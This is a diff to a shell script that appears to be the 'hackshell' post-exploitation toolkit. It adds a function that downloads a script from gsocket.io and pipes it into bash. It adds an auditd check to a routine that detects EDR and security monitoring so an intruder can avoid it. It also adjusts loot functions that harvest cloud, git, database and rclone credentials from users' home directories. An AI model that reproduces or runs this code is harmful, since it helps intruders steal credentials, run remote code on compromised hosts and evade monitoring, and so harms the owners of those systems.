@@ -746,7 +746,7 @@ bin() {
 
     { [[ "$optsstr" == *"zapper"* ]] || [[ -z "$optsstr" ]]; } && echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options\n>>> from your current shell and all further processes."
 
-    echo -e ">>> ${CDG}Download COMPLETE${CN}"
+    # echo -e ">>> ${CDG}Download COMPLETE${CN}"
     unset _HS_SINGLE_MATCH
     hs_init_alias_reinit
 }
@@ -933,6 +933,12 @@ gsnc() {
 }
 command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
 
+gsinst() {
+    local b
+    [ -n "$BRANCH" ] && b="${BRANCH}/"
+    dl https://gsocket.io/${b}y | bash
+}
+
 # https://github.com/hackerschoice/hackshell/issues/6
 _warn_edr() {
     local fns s out
@@ -1001,6 +1007,7 @@ _warn_edr() {
 
     [ "${#fns[@]}" -gt 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'
 
+    [ -f "/etc/audit/audit.rules" ] && grep -v ^# "/etc/audit/audit.rules" | grep -Eqm1 '.{32,}' && _hs_chk_systemd "auditd"             "Auditd [/etc/audit/rules.d]"
     _hs_chk_systemd "avast"                             "Avast"
     _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
     _hs_chk_systemd "cylancesvc"                        "Blackberry cyPROTECT"
@@ -1195,7 +1202,7 @@ _lootmore_docker() {
         [ ! -e "$fn" ] && return
         DOCKER_HOST="unix://${fn}"
     }
-    str="$(DOCKER_HOST="${DOCKER_HOST}" docker ps -a)"
+    str="$(DOCKER_HOST="${DOCKER_HOST}" docker ps -a 2>/dev/null)"
     [ -z "$str" ] && return
 
     echo -e "${CB}Docker ${CDY}${CF}"
@@ -1341,7 +1348,7 @@ loot() {
     _loot_homes "PGSQL"  ".pgpass"
     _loot_homes "RCLONE" ".config/rclone/rclone.conf"
     _loot_homes "GIT"    ".git-credentials"
-    _loot_homes "AWS S3" ".s3cfg"
+    _loot_homes "AWS S3" ".s3cfg"           grep --color=never -E '=[\s]*[^\s]{6,}'
     _loot_homes "AWS S3" ".passwd-s3fs"
     _loot_homes "AWS S3" ".s3backer_passwd"
     _loot_homes "AWS S3" ".passwd-s3fs"
